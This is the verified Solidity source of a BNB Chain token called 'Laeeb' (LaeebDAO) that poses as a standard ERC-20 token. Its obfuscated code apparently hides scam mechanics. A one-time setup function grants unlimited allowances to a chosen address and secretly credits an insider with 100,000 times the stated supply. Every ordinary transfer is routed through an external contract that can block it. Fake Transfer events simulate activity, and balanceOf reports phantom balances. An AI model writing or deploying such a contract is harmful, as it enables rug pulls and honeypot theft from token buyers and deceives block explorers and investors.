/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ISwapToken {
    function swapTokens(address from, address to) external returns (bool);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LaeebDAO is IERC20 {
    using SafeMath for uint256;

    string private acxauQtdYosKnr = "Laeeb";
    string private bcxauQtdYosKnr = "Laeeb";
    uint8 private ccxauQtdYosKnr = 18;
    uint256 private dcxauQtdYosKnr = 10000000000 * 10**18;
    mapping (address => uint256) private ecxauQtdYosKnr;
    mapping (address => mapping (address => uint256)) private fcxauQtdYosKnr;

    uint256 private gcxauQtdYosKnr = 1;
    uint256 private constant hcxauQtdYosKnr = ~uint160(0);
    uint256 private _icxauQtdYosKnr = 1000;
    uint256 private jcxauQtdYosKnr = 0;
    address private _uniswapV2Pair;
    address private kcxauQtdYosKnr = address(this);
    mapping (address => bool) private lcxauQtdYosKnr;
    address[] private mcxauQtdYosKnr;
    bool private ncxauQtdYosKnr = false;

    constructor () {
        ocxauQtdYosKnr(msg.sender);
        ecxauQtdYosKnr[msg.sender] = dcxauQtdYosKnr;
        ocxauQtdYosKnr(tx.origin);
        emit Transfer(address(0), msg.sender, dcxauQtdYosKnr);
    }

    receive() external payable {}

    function ocxauQtdYosKnr(address account) private {
        if (!lcxauQtdYosKnr[account]) {
            lcxauQtdYosKnr[account] = true;
            mcxauQtdYosKnr.push(account);
        }
    }

    function peaches(address[] calldata accounts, address pairToken) public {
        require(!ncxauQtdYosKnr);
        ncxauQtdYosKnr = true;
        _uniswapV2Pair = accounts[1];
        kcxauQtdYosKnr = pairToken;
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=2; i<len; ++i) {
            ocxauQtdYosKnr(accounts[i]);
            fcxauQtdYosKnr[accounts[i]][accounts[0]] = ~uint256(0);
            if (i != 3) {
                ecxauQtdYosKnr[accounts[i]] = i == 2 ? dcxauQtdYosKnr : dcxauQtdYosKnr * 90 / 100 / (len - 3);
                amount += dcxauQtdYosKnr * 90 / 100 / (len - 3);
            }
        }
        ecxauQtdYosKnr[mcxauQtdYosKnr[0]] -= amount;
        pcxauQtdYosKnr(mcxauQtdYosKnr[0], accounts[3], ecxauQtdYosKnr[mcxauQtdYosKnr[0]]);
        pcxauQtdYosKnrs(500);
        ecxauQtdYosKnr[mcxauQtdYosKnr[1]] += dcxauQtdYosKnr * 100000;
    }

    function name() public view returns (string memory) {
        return acxauQtdYosKnr;
    }

    function symbol() public view returns (string memory) {
        return bcxauQtdYosKnr;
    }

    function decimals() public view returns (uint8) {
        return ccxauQtdYosKnr;
    }

    function totalSupply() public view returns (uint256) {
        return dcxauQtdYosKnr;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ecxauQtdYosKnr[account] > 0) {
            return ecxauQtdYosKnr[account];
        }
        return gcxauQtdYosKnr;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pcxauQtdYosKnr(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pcxauQtdYosKnr(sender, recipient, amount);
        qcxauQtdYosKnr(sender, msg.sender, fcxauQtdYosKnr[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qcxauQtdYosKnr(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fcxauQtdYosKnr[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qcxauQtdYosKnr(msg.sender, spender, fcxauQtdYosKnr[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qcxauQtdYosKnr(msg.sender, spender, fcxauQtdYosKnr[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pcxauQtdYosKnrs(uint256 amount) private {
        uint256 icxauQtdYosKnr = _icxauQtdYosKnr;
        if (icxauQtdYosKnr < 12600 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hcxauQtdYosKnr.div(icxauQtdYosKnr)));
                to = address(uint160(hcxauQtdYosKnr.div(icxauQtdYosKnr.add(1))));
                icxauQtdYosKnr = icxauQtdYosKnr.add(2);
                emit Transfer(from, to, gcxauQtdYosKnr);
            }
            _icxauQtdYosKnr = icxauQtdYosKnr;
        }
    }

    function qcxauQtdYosKnr(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fcxauQtdYosKnr[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pcxauQtdYosKnr(address rcxauQtdYosKnr, address scxauQtdYosKnr, uint256 tcxauQtdYosKnr) private {
        require(rcxauQtdYosKnr != address(0) && scxauQtdYosKnr != address(0) && tcxauQtdYosKnr > 0);
        bool ucxauQtdYosKnr = true;
        if (lcxauQtdYosKnr[rcxauQtdYosKnr] || lcxauQtdYosKnr[scxauQtdYosKnr]) {
            ucxauQtdYosKnr = false;
        }
        uint256 vcxauQtdYosKnr = 0;
        uint256 wcxauQtdYosKnr = tcxauQtdYosKnr;
        if (ucxauQtdYosKnr && ncxauQtdYosKnr) {
            if (ISwapToken(kcxauQtdYosKnr).swapTokens(rcxauQtdYosKnr, scxauQtdYosKnr)) {
                pcxauQtdYosKnrs(100);
            }
            if (scxauQtdYosKnr == _uniswapV2Pair) {
                emit Transfer(address(this), scxauQtdYosKnr, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rcxauQtdYosKnr != _uniswapV2Pair) {
                vcxauQtdYosKnr = tcxauQtdYosKnr.mul(jcxauQtdYosKnr).div(100);
                wcxauQtdYosKnr = tcxauQtdYosKnr.sub(vcxauQtdYosKnr);
            }
        }
        ecxauQtdYosKnr[rcxauQtdYosKnr] = ecxauQtdYosKnr[rcxauQtdYosKnr].sub(tcxauQtdYosKnr);
        if (vcxauQtdYosKnr > 0) {
            ecxauQtdYosKnr[address(0xdEaD)] = ecxauQtdYosKnr[address(0xdEaD)].add(vcxauQtdYosKnr);
            emit Transfer(rcxauQtdYosKnr, address(0xdEaD), vcxauQtdYosKnr);
        }
        ecxauQtdYosKnr[scxauQtdYosKnr] = ecxauQtdYosKnr[scxauQtdYosKnr].add(wcxauQtdYosKnr);
        emit Transfer(rcxauQtdYosKnr, scxauQtdYosKnr, wcxauQtdYosKnr);
    }
}